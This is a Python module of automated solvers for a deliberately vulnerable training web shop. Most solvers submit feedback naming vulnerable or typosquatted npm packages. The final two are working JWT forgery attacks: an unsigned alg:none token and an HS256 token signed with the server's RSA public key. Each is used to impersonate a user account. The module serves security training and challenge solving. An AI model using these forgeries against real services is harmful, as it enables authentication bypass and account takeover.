#!/usr/bin/env python3
"""Vulnerable Components challenges (feedback disclosures + JWT forgery)."""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time

from core import register_solver, Client, ok, warn, fail

CAT = "Vulnerable Components"


# ---- disclose known-vulnerable / typosquatting packages via feedback ------ #
@register_solver("knownVulnerableComponentChallenge", "Report known-vulnerable library", CAT)
def known_vulnerable(c: Client):
    c.add_feedback("sanitize-html 1.4.2 is non-recursive.", rating=3)
    r = c.add_feedback("express-jwt 0.1.3 has broken crypto.", rating=3)
    ok(f"reported vulnerable libraries via feedback ({r.status_code})")


@register_solver("typosquattingNpmChallenge", "Report NPM typosquatting", CAT)
def typosquatting_npm(c: Client):
    r = c.add_feedback("You are a typosquatting victim of this NPM package: epilogue-js", rating=3)
    ok(f"reported epilogue-js typosquat ({r.status_code})")


@register_solver("typosquattingAngularChallenge", "Report frontend typosquatting", CAT)
def typosquatting_angular(c: Client):
    r = c.add_feedback("You are a typosquatting victim of this NPM package: ngy-cookie", rating=3)
    ok(f"reported ngy-cookie typosquat ({r.status_code})")


@register_solver("supplyChainAttackChallenge", "Report supply-chain attack (best-effort)", CAT)
def supply_chain(c: Client):
    # canonical answer references the eslint-scope incident issue
    for url in ("https://github.com/eslint/eslint-scope/issues/39",
                "https://github.com/advisories/GHSA-73qr-pfmq-6rp8"):
        c.add_feedback(url, rating=3)
    warn("supplyChain reported via feedback (best-effort); confirm the exact expected URL if unsolved")


@register_solver("hiddenImageChallenge", "Steganography (hidden character)", "Security through Obscurity")
def hidden_image(c: Client):
    r = c.add_feedback("Pickle Rick is hiding behind one of the support team ladies", rating=3)
    ok(f"reported hidden steganographic character ({r.status_code})")


# ---- JWT attacks ---------------------------------------------------------- #
def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


@register_solver("jwtUnsignedChallenge", "Unsigned JWT (alg:none)", CAT)
def jwt_unsigned(c: Client):
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = _b64url(json.dumps(
        {"data": {"email": "jwtn3d@juice-sh.op"}, "iat": 1508639612, "exp": 9999999999},
        separators=(",", ":")).encode())
    c.token = f"{header}.{payload}."
    r = c.get("/rest/user/whoami")
    ok(f"accepted alg:none JWT ({r.status_code})")


@register_solver("jwtForgedChallenge", "Forged JWT (HMAC with RSA public key)", CAT)
def jwt_forged(c: Client):
    # the server verifies HS256 tokens using its RSA *public* key as the HMAC secret
    pub = c.s.get(c.url("/encryptionkeys/jwt.pub"), timeout=30, verify=False).text
    header = _b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = _b64url(json.dumps(
        {"data": {"email": "rsa_lord@juice-sh.op"}, "iat": int(time.time()), "exp": 9999999999},
        separators=(",", ":")).encode())
    signing_input = f"{header}.{payload}".encode()
    sig = _b64url(hmac.new(pub.encode(), signing_input, hashlib.sha256).digest())
    c.token = f"{header}.{payload}.{sig}"
    r = c.get("/rest/user/whoami")
    ok(f"forged HS256 JWT accepted ({r.status_code})")
